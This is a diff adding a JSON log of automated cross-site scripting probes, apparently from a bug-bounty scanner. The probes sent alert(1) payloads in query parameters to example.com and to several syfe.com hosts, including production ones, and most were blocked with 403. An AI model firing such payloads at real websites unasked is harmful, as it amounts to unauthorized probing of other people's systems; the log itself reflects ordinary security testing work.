@@ -1,0 +1,575 @@
+[
+  {
+    "vreme": "2025-05-22T23:07:38.691912",
+    "url": "https://example.com?input=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%7D",
+    "status": 200,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:07:43.532615",
+    "url": "https://example.com?search=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Csvg%2Fonload%3Dalert%281%29%3E%27%7D",
+    "status": 200,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<svg/onload=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:07:50.255073",
+    "url": "https://example.com?q=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%7D",
+    "status": 200,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<img src=x onerror=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:07:54.941073",
+    "url": "https://example.com?query=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%22%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%22%7D",
+    "status": 200,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:18:05.409958",
+    "url": "https://example.com?s=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%7D",
+    "status": 200,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:18:10.768531",
+    "url": "https://example.com?s=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Csvg%2Fonload%3Dalert%281%29%3E%27%7D",
+    "status": 200,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<svg/onload=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:18:17.444605",
+    "url": "https://example.com?s=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%7D",
+    "status": 200,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<img src=x onerror=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:18:22.887415",
+    "url": "https://example.com?term=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%22%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%22%7D",
+    "status": 200,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:23:41.974354",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?query=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:23:47.743798",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?search=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Csvg%2Fonload%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<svg/onload=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:23:53.439963",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?input=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<img src=x onerror=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:23:58.931663",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?q=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%22%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%22%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:24:04.644445",
+    "url": "https://api-uat-bugbounty.nonprod.syfe.com?q=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:24:10.749958",
+    "url": "https://api-uat-bugbounty.nonprod.syfe.com?s=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Csvg%2Fonload%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<svg/onload=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:24:16.541106",
+    "url": "https://api-uat-bugbounty.nonprod.syfe.com?term=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<img src=x onerror=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:24:21.658204",
+    "url": "https://api-uat-bugbounty.nonprod.syfe.com?query=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%22%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%22%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:24:25.197624",
+    "url": "https://www.syfe.com?s=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:24:29.034817",
+    "url": "https://www.syfe.com?q=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Csvg%2Fonload%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<svg/onload=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:24:34.771060",
+    "url": "https://www.syfe.com?s=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<img src=x onerror=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:24:39.283264",
+    "url": "https://www.syfe.com?q=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%22%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%22%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:24:44.323238",
+    "url": "https://api.syfe.com?query=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:24:48.848019",
+    "url": "https://api.syfe.com?search=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Csvg%2Fonload%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<svg/onload=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:24:54.009501",
+    "url": "https://api.syfe.com?term=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<img src=x onerror=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:25:00.019933",
+    "url": "https://api.syfe.com?q=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%22%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%22%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:25:06.178414",
+    "url": "https://alfred.syfe.com?search=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:25:11.566816",
+    "url": "https://alfred.syfe.com?search=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Csvg%2Fonload%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<svg/onload=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:25:16.970766",
+    "url": "https://alfred.syfe.com?input=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<img src=x onerror=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:25:22.482022",
+    "url": "https://alfred.syfe.com?input=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%22%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%22%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:25:27.263201",
+    "url": "https://mark8.syfe.com?term=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:25:32.638603",
+    "url": "https://mark8.syfe.com?q=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Csvg%2Fonload%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<svg/onload=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:25:36.795756",
+    "url": "https://mark8.syfe.com?s=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<img src=x onerror=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:25:41.685886",
+    "url": "https://mark8.syfe.com?search=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%22%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%22%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:37:28.864296",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?s=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:37:34.919083",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?q=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Csvg%2Fonload%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<svg/onload=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:37:41.634123",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?input=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<img src=x onerror=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:37:48.186455",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?query=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%22%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%22%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:37:53.872852",
+    "url": "https://api-uat-bugbounty.nonprod.syfe.com?q=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:37:57.651581",
+    "url": "https://api-uat-bugbounty.nonprod.syfe.com?input=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Csvg%2Fonload%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<svg/onload=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:38:01.829150",
+    "url": "https://api-uat-bugbounty.nonprod.syfe.com?q=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<img src=x onerror=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:38:07.625105",
+    "url": "https://www.syfe.com?term=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:38:11.710597",
+    "url": "https://www.syfe.com?term=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Csvg%2Fonload%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<svg/onload=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:38:15.241304",
+    "url": "https://api.syfe.com?query=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:38:19.115806",
+    "url": "https://api.syfe.com?term=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<img src=x onerror=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:38:25.179340",
+    "url": "https://alfred.syfe.com?query=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Csvg%2Fonload%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<svg/onload=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:38:30.593243",
+    "url": "https://alfred.syfe.com?input=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%22%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%22%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:38:35.423599",
+    "url": "https://mark8.syfe.com?input=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<script>alert(1)</script>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:38:39.597211",
+    "url": "https://mark8.syfe.com?input=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Csvg%2Fonload%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<svg/onload=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:38:45.289039",
+    "url": "https://mark8.syfe.com?input=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%27%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<img src=x onerror=alert(1)>"
+    }
+  },
+  {
+    "vreme": "2025-05-22T23:38:50.082865",
+    "url": "https://mark8.syfe.com?s=%7B%27url%27%3A+%27https%3A%2F%2Fexample.com%27%2C+%27payload%27%3A+%22%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%22%7D",
+    "status": 403,
+    "payload": {
+      "url": "https://example.com",
+      "payload": "<iframe src='javascript:alert(1)'></iframe>"
+    }
+  },
+  {
+    "vreme": "2025-05-23T00:02:04.673414",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?term=%3Ciframe+src%3D%27javascript%3A%3Csvg%2Fonload%3Dalert%281%29%3E%27%3E%3C%2Fiframe%3E",
+    "status": 403,
+    "payload": "<iframe src='javascript:<svg/onload=alert(1)>'></iframe>"
+  },
+  {
+    "vreme": "2025-05-23T00:02:17.806007",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?term=%3Cimg+src%3D%27x%27+onerror%3D%27%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%3E",
+    "status": 403,
+    "payload": "<img src='x' onerror='<img src=x onerror=alert(1)>'>"
+  },
+  {
+    "vreme": "2025-05-23T00:02:33.801487",
+    "url": "https://uat-bugbounty.nonprod.syfe.com?query=%3Cimg+src%3D%27x%27+onerror%3D%27%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%27%3E",
+    "status": 403,
+    "payload": "<img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>"
+  },
+  {
+    "vreme": "2025-05-23T00:02:46.969259",
+    "url": "https://api-uat-bugbounty.nonprod.syfe.com?query=%3Csvg%2Fonload%3Dalert%281%29",
+    "status": 403,
+    "payload": "<svg/onload=alert(1)"
+  },
+  {
+    "vreme": "2025-05-23T00:03:03.918119",
+    "url": "https://api-uat-bugbounty.nonprod.syfe.com?s=%3Cimg+src%3D%27x%27+onerror%3D%27%3Csvg%2Fonload%3Dalert%281%29%3E%27%3E",
+    "status": 403,
+    "payload": "<img src='x' onerror='<svg/onload=alert(1)>'>"
+  },
+  {
+    "vreme": "2025-05-23T00:03:16.053208",
+    "url": "https://api-uat-bugbounty.nonprod.syfe.com?search=%3Cimg+src%3D%27x%27+onerror%3D%27%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%27%3E",
+    "status": 403,
+    "payload": "<img src='x' onerror='<iframe src='javascript:alert(1)'></iframe>'>"
+  },
+  {
+    "vreme": "2025-05-23T00:03:29.935980",
+    "url": "https://www.syfe.com?q=%3Etpircs%2F%3C%291%28trela%3Etpircs%3C",
+    "status": 200,
+    "payload": ">tpircs/<)1(trela>tpircs<"
+  },
+  {
+    "vreme": "2025-05-23T00:03:43.662628",
+    "url": "https://www.syfe.com?s=%3Ciframe+src%3D%27javascript%3A%3Csvg%2Fonload%3Dalert%281%29%3E%27%3E%3C%2Fiframe%3E",
+    "status": 403,
+    "payload": "<iframe src='javascript:<svg/onload=alert(1)>'></iframe>"
+  },
+  {
+    "vreme": "2025-05-23T00:04:00.209991",
+    "url": "https://www.syfe.com?term=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E",
+    "status": 403,
+    "payload": "<img src=x onerror=alert(1)>"
+  },
+  {
+    "vreme": "2025-05-23T00:04:15.055291",
+    "url": "https://www.syfe.com?input=%3Eemarfi%2F%3C%3E%27%291%28trela%3Atpircsavaj%27%3Dcrs+emarfi%3C",
+    "status": 200,
+    "payload": ">emarfi/<>')1(trela:tpircsavaj'=crs emarfi<"
+  },
+  {
+    "vreme": "2025-05-23T00:04:28.457218",
+    "url": "https://api.syfe.com?input=%3Cbody+onload%3D%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3E",
+    "status": 403,
+    "payload": "<body onload=<script>alert(1)</script>>"
+  },
+  {
+    "vreme": "2025-05-23T00:04:40.511533",
+    "url": "https://api.syfe.com?q=%3Ciframe+src%3D%27javascript%3A%3Csvg%2Fonload%3Dalert%281%29%3E%27%3E%3C%2Fiframe%3E",
+    "status": 403,
+    "payload": "<iframe src='javascript:<svg/onload=alert(1)>'></iframe>"
+  },
+  {
+    "vreme": "2025-05-23T00:04:53.039289",
+    "url": "https://api.syfe.com?input=%3Cimg+src%3Dx+onerror%3Dwindow.alert%281%29%3E",
+    "status": 403,
+    "payload": "<img src=x onerror=window.alert(1)>"
+  },
+  {
+    "vreme": "2025-05-23T00:05:05.501527",
+    "url": "https://api.syfe.com?s=%3Cbody+onload%3D%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E%3E",
+    "status": 403,
+    "payload": "<body onload=<iframe src='javascript:alert(1)'></iframe>>"
+  },
+  {
+    "vreme": "2025-05-23T00:05:16.062178",
+    "url": "https://alfred.syfe.com?input=%3Cimg+src%3D%27x%27+onerror%3D%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%3E",
+    "status": 403,
+    "payload": "<img src='x' onerror='<script>alert(1)</script>'>"
+  },
+  {
+    "vreme": "2025-05-23T00:05:25.688424",
+    "url": "https://alfred.syfe.com?s=%3Cimg+src%3D%27x%27+onerror%3D%27%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%27%3E",
+    "status": 403,
+    "payload": "<img src='x' onerror='<img src=x onerror=alert(1)>'>"
+  },
+  {
+    "vreme": "2025-05-23T00:05:37.611881",
+    "url": "https://alfred.syfe.com?query=%3Eemarfi%2F%3C%3E%27%291%28trela%3Atpircsavaj%27%3Dcrs+emarfi%3C",
+    "status": 401,
+    "payload": ">emarfi/<>')1(trela:tpircsavaj'=crs emarfi<"
+  },
+  {
+    "vreme": "2025-05-23T00:05:47.071557",
+    "url": "https://mark8.syfe.com?term=%3Cimg+src%3D%27x%27+onerror%3D%27%3Cscript%3Ealert%281%29%3C%2Fscript%3E%27%3E",
+    "status": 403,
+    "payload": "<img src='x' onerror='<script>alert(1)</script>'>"
+  },
+  {
+    "vreme": "2025-05-23T00:06:01.519064",
+    "url": "https://mark8.syfe.com?input=%3Cbody+onload%3D%3Csvg%2Fonload%3Dalert%281%29%3E%3E",
+    "status": 403,
+    "payload": "<body onload=<svg/onload=alert(1)>>"
+  },
+  {
+    "vreme": "2025-05-23T00:06:17.189797",
+    "url": "https://mark8.syfe.com?term=%3Cbody+onload%3D%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E%3E",
+    "status": 403,
+    "payload": "<body onload=<img src=x onerror=alert(1)>>"
+  },
+  {
+    "vreme": "2025-05-23T00:06:33.402833",
+    "url": "https://mark8.syfe.com?term=%3Ciframe+src%3D%27javascript%3Aalert%281%29%27%3E%3C%2Fiframe%3E",
+    "status": 403,
+    "payload": "<iframe src='javascript:alert(1)'></iframe>"
+  },
+  {
+    "vreme": "2025-05-23T05:42:04.009206",
+    "url": "https://example.com",
+    "status": 200,
+    "payload": "<svg/onload=alert(1)>"
+  }
+]
